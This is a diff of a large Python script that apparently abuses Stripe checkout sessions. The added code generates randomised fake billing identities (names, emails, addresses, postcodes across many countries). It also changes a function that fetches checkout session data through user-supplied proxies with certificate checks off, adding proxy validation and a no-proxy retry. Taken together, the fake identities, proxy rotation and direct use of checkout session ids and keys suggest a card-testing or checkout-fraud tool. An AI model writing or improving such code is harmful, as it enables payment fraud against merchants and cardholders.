+        'Lee', 'Perez', 'Thompson', 'White', 'Harris', 'Sanchez', 'Clark',
+        'Ramirez', 'Lewis', 'Robinson', 'Walker', 'Young', 'Allen', 'King',
+        'Wright', 'Scott', 'Torres', 'Nguyen', 'Hill', 'Flores', 'Green',
+        'Adams', 'Nelson', 'Baker', 'Hall', 'Rivera', 'Campbell', 'Mitchell',
+        'Carter', 'Roberts', 'Turner', 'Phillips', 'Evans', 'Collins', 'Edwards',
+        'Stewart', 'Morris', 'Murphy', 'Cook', 'Rogers', 'Morgan', 'Peterson',
+        'Cooper', 'Reed', 'Bailey', 'Bell', 'Howard', 'Ward', 'Cox', 'Diaz',
+        'Richardson', 'Wood', 'Watson', 'Brooks', 'Bennett', 'Gray', 'James',
+        'Reyes', 'Cruz', 'Hughes', 'Price', 'Myers', 'Long', 'Foster', 'Sanders',
+        'Ross', 'Powell', 'Sullivan', 'Russell', 'Ortiz', 'Jenkins', 'Perry',
+        'Butler', 'Barnes', 'Fisher', 'Henderson', 'Coleman', 'Simmons',
+        'Patterson', 'Jordan', 'Reynolds', 'Hamilton', 'Graham', 'Kim',
+        'Gonzales', 'Alexander', 'Ramsey', 'Raman', 'Raman1', 'Raman2',
+        'Raman3', 'Raman4', 'Raman5', 'Raman6', 'Raman7', 'Raman8', 'Raman9',
+        'Raman10', 'Raman11', 'Raman12', 'Raman13', 'Raman14', 'Raman15',
+        'Raman16', 'Raman17', 'Raman18', 'Raman19', 'Raman20', 'Raman21',
+        'Raman22', 'Raman23', 'Raman24', 'Raman25', 'Raman26', 'Raman27',
+        'Raman28', 'Raman29', 'Raman30', 'Rahul', 'Rahul1', 'Rahul2', 'Rahul3',
+        'Rahul4', 'Rahul5', 'Rahul6', 'Rahul7', 'Rahul8', 'Rahul9', 'Rahul10',
+        'Rahul11', 'Rahul12', 'Rahul13', 'Rahul14', 'Rahul15', 'Rahul16',
+        'Rahul17', 'Rahul18', 'Rahul19', 'Rahul20', 'Rahul21', 'Rahul22',
+        'Rahul23', 'Rahul24', 'Rahul25', 'Rahul26', 'Rahul27', 'Rahul28',
+        'Rahul29', 'Rahul30',
+    ]
+    
+    domains = [
+        'gmail.com', 'yahoo.com', 'outlook.com', 'hotmail.com', 'protonmail.com',
+        'icloud.com', 'aol.com', 'mail.com', 'live.com', 'msn.com',
+        'proton.me', 'tutanota.com', 'gmx.com', 'zoho.com', 'yandex.com',
+        'fastmail.com', 'hey.com', 'skiff.com'
+    ]
+    
+    street_names = [
+        'Main St', 'Oak Ave', 'Maple Dr', 'Cedar Ln', 'Pine Rd', 'Elm St',
+        'Washington Blvd', 'Park Ave', 'Lake Dr', 'Hill Rd', 'View Dr',
+        'Sunset Blvd', 'Riverside Dr', 'Highland Ave', 'Meadow Ln', 'Forest Rd',
+        'Broadway', 'Parkway', 'Lakeshore Dr', 'Mountain View Rd', 'Valley Rd',
+        'Springfield Rd', 'Willow Ln', 'Magnolia Ave', 'Rosewood Dr', 'Cypress Ln',
+        'Hollywood Blvd', 'Ocean Ave', 'Palms Blvd', 'Sunset Strip', 'Vine St',
+        'Sunset Ave', 'Palm Dr', 'Beverly Blvd', 'Rodeo Dr', 'Melrose Ave',
+        'Santa Monica Blvd', 'Wilshire Blvd', 'Ventura Blvd', 'Mulholland Dr'
+    ]
+    
+    cities_states_zips = [
+        ('New York', 'NY', ['10001', '10002', '10003', '10004', '10005', '10006', '10007', '10008', '10009', '10010']),
+        ('Los Angeles', 'CA', ['90001', '90002', '90003', '90004', '90005', '90006', '90007', '90008', '90009', '90010']),
+        ('Chicago', 'IL', ['60601', '60602', '60603', '60604', '60605', '60606', '60607', '60608', '60609', '60610']),
+        ('Houston', 'TX', ['77001', '77002', '77003', '77004', '77005', '77006', '77007', '77008', '77009', '77010']),
+        ('Phoenix', 'AZ', ['85001', '85002', '85003', '85004', '85005', '85006', '85007', '85008', '85009', '85010']),
+        ('Philadelphia', 'PA', ['19101', '19102', '19103', '19104', '19105', '19106', '19107', '19108', '19109', '19110']),
+        ('San Antonio', 'TX', ['78201', '78202', '78203', '78204', '78205', '78206', '78207', '78208', '78209', '78210']),
+        ('San Diego', 'CA', ['92101', '92102', '92103', '92104', '92105', '92106', '92107', '92108', '92109', '92110']),
+        ('Dallas', 'TX', ['75201', '75202', '75203', '75204', '75205', '75206', '75207', '75208', '75209', '75210']),
+        ('San Jose', 'CA', ['95101', '95102', '95103', '95104', '95105', '95106', '95107', '95108', '95109', '95110']),
+        ('Austin', 'TX', ['78701', '78702', '78703', '78704', '78705', '78706', '78707', '78708', '78709', '78710']),
+        ('Jacksonville', 'FL', ['32201', '32202', '32203', '32204', '32205', '32206', '32207', '32208', '32209', '32210']),
+        ('Fort Worth', 'TX', ['76101', '76102', '76103', '76104', '76105', '76106', '76107', '76108', '76109', '76110']),
+        ('Columbus', 'OH', ['43201', '43202', '43203', '43204', '43205', '43206', '43207', '43208', '43209', '43210']),
+        ('Charlotte', 'NC', ['28201', '28202', '28203', '28204', '28205', '28206', '28207', '28208', '28209', '28210']),
+        ('San Francisco', 'CA', ['94101', '94102', '94103', '94104', '94105', '94106', '94107', '94108', '94109', '94110']),
+        ('Indianapolis', 'IN', ['46201', '46202', '46203', '46204', '46205', '46206', '46207', '46208', '46209', '46210']),
+        ('Seattle', 'WA', ['98101', '98102', '98103', '98104', '98105', '98106', '98107', '98108', '98109', '98110']),
+        ('Denver', 'CO', ['80201', '80202', '80203', '80204', '80205', '80206', '80207', '80208', '80209', '80210']),
+        ('Washington', 'DC', ['20001', '20002', '20003', '20004', '20005', '20006', '20007', '20008', '20009', '20010']),
+        ('Boston', 'MA', ['02101', '02102', '02103', '02104', '02105', '02106', '02107', '02108', '02109', '02110']),
+        ('El Paso', 'TX', ['79901', '79902', '79903', '79904', '79905', '79906', '79907', '79908', '79909', '79910']),
+        ('Detroit', 'MI', ['48201', '48202', '48203', '48204', '48205', '48206', '48207', '48208', '48209', '48210']),
+        ('Nashville', 'TN', ['37201', '37202', '37203', '37204', '37205', '37206', '37207', '37208', '37209', '37210']),
+        ('Portland', 'OR', ['97201', '97202', '97203', '97204', '97205', '97206', '97207', '97208', '97209', '97210']),
+        ('Memphis', 'TN', ['38101', '38102', '38103', '38104', '38105', '38106', '38107', '38108', '38109', '38110']),
+        ('Oklahoma City', 'OK', ['73101', '73102', '73103', '73104', '73105', '73106', '73107', '73108', '73109', '73110']),
+        ('Las Vegas', 'NV', ['89101', '89102', '89103', '89104', '89105', '89106', '89107', '89108', '89109', '89110']),
+        ('Louisville', 'KY', ['40201', '40202', '40203', '40204', '40205', '40206', '40207', '40208', '40209', '40210']),
+        ('Baltimore', 'MD', ['21201', '21202', '21203', '21204', '21205', '21206', '21207', '21208', '21209', '21210']),
+        ('Milwaukee', 'WI', ['53201', '53202', '53203', '53204', '53205', '53206', '53207', '53208', '53209', '53210']),
+        ('Albuquerque', 'NM', ['87101', '87102', '87103', '87104', '87105', '87106', '87107', '87108', '87109', '87110']),
+        ('Tucson', 'AZ', ['85701', '85702', '85703', '85704', '85705', '85706', '85707', '85708', '85709', '85710']),
+        ('Fresno', 'CA', ['93701', '93702', '93703', '93704', '93705', '93706', '93707', '93708', '93709', '93710']),
+        ('Sacramento', 'CA', ['95801', '95802', '95803', '95804', '95805', '95806', '95807', '95808', '95809', '95810']),
+        ('Kansas City', 'MO', ['64101', '64102', '64103', '64104', '64105', '64106', '64107', '64108', '64109', '64110']),
+        ('Mesa', 'AZ', ['85201', '85202', '85203', '85204', '85205', '85206', '85207', '85208', '85209', '85210']),
+        ('Atlanta', 'GA', ['30301', '30302', '30303', '30304', '30305', '30306', '30307', '30308', '30309', '30310']),
+        ('Omaha', 'NE', ['68101', '68102', '68103', '68104', '68105', '68106', '68107', '68108', '68109', '68110']),
+        ('Colorado Springs', 'CO', ['80901', '80902', '80903', '80904', '80905', '80906', '80907', '80908', '80909', '80910']),
+        ('Raleigh', 'NC', ['27601', '27602', '27603', '27604', '27605', '27606', '27607', '27608', '27609', '27610']),
+        ('Long Beach', 'CA', ['90801', '90802', '90803', '90804', '90805', '90806', '90807', '90808', '90809', '90810']),
+        ('Virginia Beach', 'VA', ['23451', '23452', '23453', '23454', '23455', '23456', '23457', '23458', '23459', '23460']),
+        ('Miami', 'FL', ['33101', '33102', '33103', '33104', '33105', '33106', '33107', '33108', '33109', '33110']),
+        ('Oakland', 'CA', ['94601', '94602', '94603', '94604', '94605', '94606', '94607', '94608', '94609', '94610']),
+        ('Minneapolis', 'MN', ['55401', '55402', '55403', '55404', '55405', '55406', '55407', '55408', '55409', '55410']),
+        ('Tulsa', 'OK', ['74101', '74102', '74103', '74104', '74105', '74106', '74107', '74108', '74109', '74110']),
+        ('Wichita', 'KS', ['67201', '67202', '67203', '67204', '67205', '67206', '67207', '67208', '67209', '67210']),
+        ('New Orleans', 'LA', ['70112', '70113', '70114', '70115', '70116', '70117', '70118', '70119', '70120', '70121']),
+        ('Arlington', 'TX', ['76001', '76002', '76003', '76004', '76005', '76006', '76007', '76008', '76009', '76010']),
+        ('Cleveland', 'OH', ['44101', '44102', '44103', '44104', '44105', '44106', '44107', '44108', '44109', '44110']),
+    ]
+    
+    countries = ["US", "GB", "CA", "AU", "DE", "FR", "IT", "ES", "NL", "BE", "CH", "SE", "NO", "DK", "FI"]
+    
+    # ============ GENERATE BILLING DETAILS ============
+    first_name = random.choice(first_names)
+    last_name = random.choice(last_names)
     full_name = f"{first_name} {last_name}"
     
-    email = f"{first_name.lower()}.{last_name.lower()}{random.randint(10, 9999)}@{random.choice(DOMAINS)}"
+    email = f"{first_name.lower()}.{last_name.lower()}{random.randint(10, 9999)}@{random.choice(domains)}"
     
     street_num = random.randint(100, 99999)
-    street = random.choice(STREET_NAMES)
+    street = random.choice(street_names)
     address = f"{street_num} {street}"
     
-    city, state, zip_list = random.choice(CITIES_STATES_ZIPS)
-    zip_code = random.choice(zip_list)
+    # Weighted country selection (80% US, 20% others)
+    country = random.choices(countries, weights=[0.8, 0.05, 0.05, 0.05, 0.01, 0.01, 0.01, 0.01, 0.01, 0.01, 0.01, 0.01, 0.01, 0.01, 0.01])[0]
     
-    phone = f"+1{random.randint(200, 999)}{random.randint(100, 999)}{random.randint(1000, 9999)}"
-    
-    countries = ["US", "GB", "CA", "AU"]
-    country = random.choices(countries, weights=[0.8, 0.1, 0.05, 0.05])[0]
-    
-    if country == "GB":
-        zip_code = random.choice(["SW1A 1AA", "EC1A 1BB", "M1 1AE", "B1 1AA", "L1 1AA"])
-        city = random.choice(["London", "Manchester", "Birmingham", "Liverpool", "Edinburgh"])
-        state = ""
+    # Generate city, state, zip based on country
+    if country == "US":
+        city, state, zip_list = random.choice(cities_states_zips[:30])
+        zip_code = random.choice(zip_list)
+    elif country == "GB":
+        city = random.choice(["London", "Manchester", "Birmingham", "Liverpool", "Edinburgh", "Glasgow", "Leeds", "Sheffield"])
+        state = random.choice(["England", "Scotland", "Wales", "Northern Ireland"])
+        zip_code = random.choice(["SW1A 1AA", "EC1A 1BB", "M1 1AE", "B1 1AA", "L1 1AA", "EH1 1AA", "G1 1AA", "LS1 1AA"])
     elif country == "CA":
-        city = random.choice(["Toronto", "Vancouver", "Montreal", "Calgary", "Ottawa"])
-        state = random.choice(["ON", "BC", "QC", "AB", "MB"])
+        city = random.choice(["Toronto", "Vancouver", "Montreal", "Calgary", "Ottawa", "Edmonton", "Winnipeg", "Quebec City"])
+        state = random.choice(["ON", "BC", "QC", "AB", "MB", "SK", "NS", "NB"])
         zip_code = f"{random.choice(['A','B','C','E','G','H','J','K','L','M','N','P','R','S','T','V','X','Y'])}{random.randint(1,9)}{random.randint(0,9)} {random.randint(0,9)}{random.choice(['A','B','C','E','G','H','J','K','L','M','N','P','R','S','T','V','X','Y'])}{random.randint(0,9)}"
     elif country == "AU":
-        city = random.choice(["Sydney", "Melbourne", "Brisbane", "Perth", "Adelaide"])
-        state = random.choice(["NSW", "VIC", "QLD", "WA", "SA"])
+        city = random.choice(["Sydney", "Melbourne", "Brisbane", "Perth", "Adelaide", "Gold Coast", "Canberra", "Newcastle"])
+        state = random.choice(["NSW", "VIC", "QLD", "WA", "SA", "TAS", "ACT", "NT"])
         zip_code = str(random.randint(2000, 7000))
+    elif country == "DE":
+        city = random.choice(["Berlin", "Hamburg", "Munich", "Cologne", "Frankfurt", "Stuttgart", "Dusseldorf", "Dortmund"])
+        state = random.choice(["BE", "HH", "BY", "NW", "HE", "BW", "SN", "RP"])
+        zip_code = f"{random.randint(10000, 99999)}"
+    elif country == "FR":
+        city = random.choice(["Paris", "Marseille", "Lyon", "Toulouse", "Nice", "Nantes", "Strasbourg", "Montpellier"])
+        state = random.choice(["IDF", "PAC", "ARA", "OCC", "HDF", "NAQ", "BFC", "CVL"])
+        zip_code = f"{random.randint(10000, 99999)}"
+    elif country == "IT":
+        city = random.choice(["Rome", "Milan", "Naples", "Turin", "Palermo", "Genoa", "Bologna", "Florence"])
+        state = random.choice(["RM", "MI", "NA", "TO", "PA", "GE", "BO", "FI"])
+        zip_code = f"{random.randint(10000, 99999)}"
+    elif country == "ES":
+        city = random.choice(["Madrid", "Barcelona", "Valencia", "Seville", "Zaragoza", "Malaga", "Murcia", "Palma"])
+        state = random.choice(["M", "B", "V", "SE", "Z", "MA", "MU", "PM"])
+        zip_code = f"{random.randint(10000, 99999)}"
+    else:
+        city = random.choice(["Amsterdam", "Brussels", "Zurich", "Stockholm", "Oslo", "Copenhagen", "Helsinki"])
+        state = random.choice(["NH", "BRU", "ZH", "AB", "OSL", "CPH", "UUS"])
+        zip_code = f"{random.randint(1000, 99999)}"
+    
+    phone = f"+1{random.randint(200, 999)}{random.randint(100, 999)}{random.randint(1000, 9999)}"
     
     return {
         "first_name": first_name,
@@ -21958,8 +22279,35 @@ async def get_fresh_stripe_checkout_data(cs: str, pk: str, proxy_url: str = None
             'timeout': httpx.Timeout(30.0, connect=10.0, read=25.0),
             'verify': False,
         }
+        
+        # ============ FIXED: Only add proxy if it's valid ============
         if proxy_url:
-            client_kwargs['proxy'] = proxy_url
+            # Validate proxy format before using it
+            try:
+                # Test if proxy has a valid port
+                if '@' in proxy_url:
+                    # Extract host:port from user:pass@host:port
+                    host_part = proxy_url.split('@')[1] if '@' in proxy_url else proxy_url
+                    if ':' in host_part:
+                        host, port = host_part.split(':')
+                        # Validate port is a number
+                        int(port)  # This will raise ValueError if not a number
+                        client_kwargs['proxy'] = proxy_url
+                        debug_print(4, f"✅ Valid proxy format: {mask_proxy(proxy_url)}")
+                    else:
+                        debug_print(1, f"❌ Invalid proxy format - no colon in host:port part: {proxy_url[:50]}...")
+                        proxy_url = None
+                elif ':' in proxy_url:
+                    # Simple host:port format
+                    host, port = proxy_url.split(':')
+                    int(port)  # Validate port is a number
+                    client_kwargs['proxy'] = proxy_url
+                else:
+                    debug_print(1, f"❌ Invalid proxy format: {proxy_url[:50]}...")
+                    proxy_url = None
+            except (ValueError, IndexError) as e:
+                debug_print(1, f"❌ Invalid proxy port: {e}")
+                proxy_url = None
         
         async with httpx.AsyncClient(**client_kwargs) as client:
             response = await client.post(
@@ -21974,7 +22322,7 @@ async def get_fresh_stripe_checkout_data(cs: str, pk: str, proxy_url: str = None
         if response.status_code != 200:
             debug_print(1, f"❌ Init request failed with status {response.status_code}")
             debug_print(1, f"❌ Response: {response.text[:200]}")
-            return None, None, None, {"status": response.status_code, "body": response.text}
+            return pk, cs, None, {"status": response.status_code, "body": response.text}
         
         init_data = response.json()
         
@@ -21985,16 +22333,19 @@ async def get_fresh_stripe_checkout_data(cs: str, pk: str, proxy_url: str = None
         else:
             error_msg = init_data.get("error", {}).get("message", "Unknown error")
             debug_print(1, f"❌ Init returned error: {error_msg}")
-            return None, None, None, {"status": response.status_code, "body": response.text, "error": error_msg}
+            return pk, cs, None, {"status": response.status_code, "body": response.text, "error": error_msg}
             
     except httpx.TimeoutException as e:
         debug_print(1, f"⏰ Timeout getting fresh init data: {e}")
-        return None, None, None, {"error": f"Timeout: {e}"}
+        return pk, cs, None, {"error": f"Timeout: {e}"}
+    except ValueError as e:
+        debug_print(1, f"❌ Proxy validation error: {e}")
+        # Try without proxy
+        return await get_fresh_stripe_checkout_data(cs, pk, None)
     except Exception as e:
         debug_print(1, f"❌ Error getting fresh init data: {e}")
         debug_print(4, f"📋 Traceback: {traceback.format_exc()}")
-        return None, None, None, {"error": str(e)}
-
+        return pk, cs, None, {"error": str(e)}
 # ============ CHECKOUT INFO FUNCTIONS ============
 
 async def get_checkout_info_stripe(url: str) -> dict:
